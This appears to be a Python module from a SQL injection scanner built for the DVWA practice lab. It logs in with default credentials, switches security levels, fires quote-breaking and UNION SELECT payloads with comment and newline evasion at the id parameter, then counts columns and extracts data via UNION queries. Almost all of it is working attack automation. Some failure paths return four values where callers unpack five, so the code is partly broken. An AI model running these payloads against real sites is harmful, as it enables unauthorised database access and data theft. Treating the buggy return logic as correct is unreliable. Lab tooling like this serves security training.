from core.sqli_scanner import SQLInjectionScanner
import requests
from urllib.parse import urljoin

class DVWASQLiScanner(SQLInjectionScanner):
    """DVWA靶场专用SQL注入扫描器"""
    
    def __init__(self, base_url, output_callback=None, progress_callback=None, changes_callback=None, enable_file_output=False, username="admin", password="password"):
        """
        初始化DVWA扫描器
        
        参数:
            base_url: DVWA靶场基础URL
            output_callback: 输出回调函数
            progress_callback: 进度更新回调函数
            changes_callback: 页面变化回调函数
            enable_file_output: 是否启用文件输出功能
            username: DVWA用户名（默认admin）
            password: DVWA密码（默认password）
        """
        self.base_url = base_url
        self.username = username
        self.password = password
        self.is_logged_in = False
        self.security_level = 'unknown'  # 安全级别
        
        super().__init__(self.base_url, output_callback, progress_callback, changes_callback, enable_file_output)
    
    def login_dvwa(self):
        """登录DVWA靶场"""
        try:
            login_url = urljoin(self.base_url, "login.php")
            login_data = {
                'username': self.username,
                'password': self.password,
                'Login': 'Login'
            }
            
            # 发送登录请求
            response = self.session.post(login_url, data=login_data, allow_redirects=False)
            
            # 检查登录是否成功（DVWA登录成功后会重定向到index.php）
            if response.status_code == 302 and 'index.php' in response.headers.get('Location', ''):
                self.is_logged_in = True
                self.print("[+] DVWA登录成功")
                return True
            else:
                self.print("未登录")
                return False
                
        except Exception as e:
            self.print(f"[-] 登录过程中发生错误: {str(e)}")
            return False
    
    def get_security_level(self):
        """获取DVWA安全级别"""
        try:
            # 访问安全设置页面
            security_url = urljoin(self.base_url, "security.php")
            response = self.session.get(security_url, timeout=10)
            
            if response.status_code == 200:
                # 从Cookie中获取安全级别
                security_cookie = self.session.cookies.get('security')
                if security_cookie:
                    return security_cookie.lower()
                else:
                    # 从页面内容中解析安全级别
                    if 'Security Level: low' in response.text:
                        return 'low'
                    elif 'Security Level: medium' in response.text:
                        return 'medium'
                    elif 'Security Level: high' in response.text:
                        return 'high'
                    else:
                        return 'unknown'
            else:
                self.print(f"[-] 无法访问安全设置页面，状态码: {response.status_code}")
                return 'unknown'
        except Exception as e:
            self.print(f"[-] 获取安全级别时发生错误: {str(e)}")
            return 'unknown'

    def set_security_level(self, level):
        """设置DVWA安全级别
        
        参数:
            level: 安全级别 ('low', 'medium', 'high')
        """
        try:
            security_url = urljoin(self.base_url, "security.php")
            
            # 构建POST数据
            data = {
                'security': level,
                'seclev_submit': 'Submit'
            }
            
            # 发送设置请求
            response = self.session.post(security_url, data=data, timeout=10)
            
            if response.status_code == 200:
                # 验证设置是否成功
                new_level = self.get_security_level()
                if new_level == level:
                    self.print(f"[+] 成功设置安全级别为: {level}")
                    self.security_level = level
                    return True
                else:
                    self.print(f"[-] 设置安全级别失败，当前级别: {new_level}")
                    return False
            else:
                self.print(f"[-] 设置安全级别失败，状态码: {response.status_code}")
                return False
                
        except Exception as e:
            self.print(f"[-] 设置安全级别时发生错误: {str(e)}")
            return False
    
    def test_connection(self):
        """测试与DVWA靶场的连接"""
        try:
            # 先尝试登录
            if not self.login_dvwa():
                self.print("未登录")
                return False
            
            # 获取安全级别
            self.security_level = self.get_security_level()
            self.print(f"[+] 当前安全级别: {self.security_level}")
            
            # 测试访问SQL注入页面
            test_url = urljoin(self.base_url, "vulnerabilities/sqli/")
            response = self.session.get(test_url, timeout=10)
            
            if response.status_code == 200:
                self.print("[+] 成功连接到DVWA SQL注入页面")
                return True
            else:
                self.print(f"[-] 连接失败，状态码: {response.status_code}")
                return False
                
        except Exception as e:
            self.print(f"[-] 连接错误: {str(e)}")
            return False
    
    def determine_injection_type_and_method(self, url):
        """
        从URL自动判断注入类型和HTTP方法
        
        参数:
            url: 目标URL
            
        返回:
            (injection_type, http_method, test_function)
        """
        # DVWA SQL注入页面默认使用GET方法和字符型注入
        return '字符型注入', 'GET', self.test_dvwa_injection
    
    def test_dvwa_injection(self):
        """测试DVWA SQL注入漏洞"""
        self.print("\n[*] 开始测试DVWA SQL注入...")
        
        # 确保已登录
        if not self.is_logged_in:
            if not self.login_dvwa():
                self.print("未登录")
                return False, None, None, None
        
        target_url = urljoin(self.base_url, "vulnerabilities/sqli/")
        
        # 首先测试正常请求
        normal_response = self.send_request(target_url, params={'id': '1', 'Submit': 'Submit'})
        if not normal_response:
            return False, None, None, None
        
        # 根据安全级别调整测试策略
        if self.security_level == 'high':
            self.print("[*] 高安全级别检测，使用复杂绕过技术...")
            # 在高安全级别下，使用更复杂的绕过技术
            

            
            # 测试编码绕过
            encoded_payloads = [
                "1' UNION SELECT 1,2-- ",
                "1'/**/UNION/**/SELECT/**/1,2-- ",
                "1'%0AUNION%0ASELECT%0A1,2-- "
            ]
            
            for payload in encoded_payloads:
                response = self.send_request(target_url, params={'id': payload, 'Submit': 'Submit'})
                is_vul, db_type = self.is_vulnerable(response)
                if is_vul:
                    self.print(f"[!] 发现SQL注入漏洞！使用Payload: {payload}")
                    return True, 'GET', 'id', None, payload
                    
        else:
            # 低/中安全级别使用标准测试
            
            # 测试基于错误的注入
            test_payloads = ['-1\'','-1\"', '-1\")', '-1`)', '-1\')', '-1%\'']
            is_vul, db_type = [], []

            for i in range(len(test_payloads)):
                response = self.send_request(target_url, params={'id': test_payloads[i], 'Submit': 'Submit'})
                a, b = self.is_vulnerable(response)
                is_vul.append(a)
                db_type.append(b)
                
            if is_vul[0] and is_vul[1]:
                self.print(f"[!] 发现数字型SQL注入漏洞！使用Payload: {test_payloads[0]}")
                return True, 'GET', 'id', None, "-1"
            else:
                for i in range(len(test_payloads)):
                    if is_vul[i]:
                        response = self.send_request(target_url, params={'id': test_payloads[i] + " #", 'Submit': 'Submit'})
                        a, b = self.is_vulnerable(response)
                        if not a:
                            self.print(f"[!] 发现基于错误的SQL注入漏洞！使用Payload: {test_payloads[i]}")
                            return True, 'GET', 'id', None, test_payloads[i]
            
            # 测试基于布尔的盲注
            # true_payload = "1' AND '1'='1"
            # false_payload = "1' AND '1'='2"
            
            # if self.check_boolean_based(target_url, true_payload, false_payload, 'GET', 'id'):
            #     self.print("[!] 发现基于布尔的SQL注入漏洞！")
            #     return True, 'GET', 'id', None
        
        self.print("[-] 未发现明显的SQL注入漏洞")
        return False, None, None, None, None



    def run_complete_scan(self, test_all_levels=False, selected_levels=None):
        """运行完整的DVWA SQL注入扫描
        
        参数:
            test_all_levels: 是否测试所有安全级别 (low, medium, high)
            selected_levels: 选中的安全级别列表
        """
        self.print("=" * 30)
        self.print("DVWA SQL注入自动化扫描器")
        self.print("=" * 30)
        
        # 初始化进度
        self.update_progress(0, "开始扫描")
        
        # 先测试连接（包含登录）
        if not self.test_connection():
            self.print("[!] 无法连接到DVWA靶场，请检查网络设置和认证信息")
            self.update_progress(100, "扫描失败")
            return
        
        if test_all_levels:
            # 测试所有安全级别
            if selected_levels:
                security_levels = selected_levels
            else:
                security_levels = ['low', 'medium', 'high']
            vulnerabilities_found = False
            
            for level in security_levels:
                self.print(f"\n[*] 正在测试安全级别: {level}")
                
                # 设置安全级别
                if self.set_security_level(level):
                    self.update_progress(20, f"设置安全级别为 {level}")
                    
                    # 在当前安全级别下运行注入测试
                    result, method, param, data_template, payload = self.test_dvwa_injection()
                    
                    if result:
                        vulnerabilities_found = True
                        self.update_progress(60, f"在 {level} 级别发现漏洞，提取信息")
                        
                        # 检测字段数
                        target_url = urljoin(self.base_url, "vulnerabilities/sqli/")
                        column_count = self.detect_column_count(target_url, method, param, data_template, payload)
                        
                        if column_count:
                            self.update_progress(80, "提取数据")
                            # 使用UNION查询提取数据
                            self.extract_with_union(target_url, method, param, data_template, payload, column_count)
                else:
                    self.print(f"[-] 无法设置安全级别为 {level}")
            
            # 扫描完成
            self.update_progress(100, "多级别扫描完成")
            if vulnerabilities_found:
                self.print(f"\n[+] 多安全级别扫描完成！发现漏洞")
            else:
                self.print(f"\n[-] 多安全级别扫描完成！未发现漏洞")
        else:
            # 仅在当前安全级别下测试
            self.update_progress(20, "连接成功，开始注入测试")
            
            # 运行注入测试
            result, method, param, data_template, payload = self.test_dvwa_injection()
            
            if result:
                self.update_progress(60, "发现漏洞，提取信息")
                
                # 检测字段数
                target_url = urljoin(self.base_url, "vulnerabilities/sqli/")
                column_count = self.detect_column_count(target_url, method, param, data_template, payload)
                
                if column_count:
                    self.update_progress(80, "提取数据")
                    # 使用UNION查询提取数据
                    self.extract_with_union(target_url, method, param, data_template, payload, column_count)
            
            # 扫描完成
            self.update_progress(100, "扫描完成")
            self.print(f"\n[+] DVWA扫描完成！")